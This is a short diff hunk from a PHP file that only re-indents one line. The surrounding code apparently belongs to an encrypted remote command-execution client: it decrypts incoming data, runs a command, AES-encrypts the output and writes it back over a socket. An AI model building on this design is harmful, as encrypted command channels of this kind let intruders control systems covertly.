@@ -103,7 +103,7 @@
 				$result .= "\33[94mexec\33[0m:: {$fnc} \33[94mcmd\33[0m:: {$full_cmd}";
 			}
 			else { $result = "error:: decrypt().\n"; }
-			$result = encrypt_cbcClient($result, $AESKey);
+            $result = encrypt_cbcClient($result, $AESKey);
     		if(socket_write($socket, $result, strlen($result)) === false) {	continue; }
 	    }
 	}
